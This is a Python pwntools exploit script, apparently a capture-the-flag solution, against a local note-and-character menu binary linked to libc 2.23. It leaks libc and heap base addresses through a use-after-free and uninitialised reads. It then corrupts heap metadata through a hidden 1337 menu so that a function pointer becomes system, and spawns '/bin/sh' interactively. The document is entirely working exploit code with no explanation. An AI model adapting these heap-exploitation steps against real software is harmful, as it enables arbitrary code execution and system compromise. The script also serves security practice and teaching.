from pwn import *

elf=ELF('pwn')
libc=ELF('libc-2.23.so')

r=process('./pwn')

def createCharacter(length,name,type):
	r.sendlineafter('Your choice : ','1')
	r.recvuntil('Length of the name :')
	r.sendline(str(length))
	r.recvuntil('The name of character :')
	r.sendline(name)
	r.recvuntil('The type of the character :')
	r.sendline(type)
def deleteName(index):
	r.sendlineafter('Your choice : ','3')
	r.recvuntil('eat:')
	r.sendline(str(index))
def viewCharacter():
	r.sendlineafter('Your choice : ','2')
def cleanAll():
	r.sendlineafter('Your choice : ','4')

createCharacter(256,'aaaaaa','xxxxxxxx')#0
createCharacter(256,'bbbbbb','yyyyyyyy')#1
deleteName(0)
cleanAll()
createCharacter(256,'','zzzzzzzz')#0
viewCharacter()
r.recvuntil('Name[0] :')
leak0=u64(r.recv(6).ljust(8,'\x00'))
libc_base=leak0-0x3c4b0a
log.success('libc_base='+str(hex(libc_base)))

createCharacter(256,'','........')#2
deleteName(2)
deleteName(1)
deleteName(0)
cleanAll()
createCharacter(256,'bbbbbbbb','........')#0
createCharacter(256,'bbbbbbbb','........')#1
createCharacter(256,'bbbbbbbb','........')#2
viewCharacter()
r.recvuntil('Name[0] :bbbbbbbb')
leak1=u64(r.recv(6).ljust(8,'\x00'))
heap_base=leak1-0x100a
log.success('heap_base='+str(hex(heap_base)))

def magicMenu():
	r.sendlineafter('Your choice : ','1337')
def newNote(size,name,content):
	r.sendlineafter('$ ','new')
	r.sendlineafter('$ note size:',str(size))
	r.sendlineafter('$ note name:',name)
	r.sendlineafter('$ note content:',content)
def editNote(index,name,content):
	r.sendlineafter('$ ','edit')
	r.sendlineafter('$ note index:',str(index))
	r.sendlineafter('$ note name:',name)
	r.sendlineafter('$ note content:',content)
def delNote(index):
	r.sendlineafter('$ ','delete')
	r.sendlineafter('$ note index:',str(index))
def showNote(index):
	r.sendlineafter('$ ','show')
	r.sendlineafter('$ note index:',str(index))
def newMark(index,content):
	r.sendlineafter('$ ','mark')
	r.sendlineafter('to mark:',str(index))
	r.sendlineafter('$ mark info:',content)
def editMark(index,content):
	r.sendlineafter('$ ','edit_mark')
	r.sendlineafter('$ mark index:',str(index))
	r.sendlineafter('$ mark content:',content)
def showMark(index):
	r.sendlineafter('$ ','show_mark')
	r.sendlineafter('$ mark index:',str(index))
def delMark(index):
	r.sendlineafter('$ ','delete_mark')
	r.sendlineafter('$ mark index:',str(index))	

magicMenu()
newNote(0x18,'00000000','0000000000000000')
newNote(0x18,'11111111','1111111111111111')
newNote(0x18,'22222222','2222222222222222')
newNote(0x18,'33333333','3333333333333333')
newMark(0,'000000')
newMark(1,'111111')
newMark(2,'222222')
newMark(3,'333333')
delMark(2)
editMark(1,'/bin/sh\x00'+'1'*0x18+p64(0x0)+p64(0x21)+p64(heap_base+0x15a0))
newNote(0x18,'44444444',p64(0x0000000100000001)+p64(heap_base+0x15d0)+p64(libc_base+libc.symbols['system']))
showMark(2)
r.interactive()

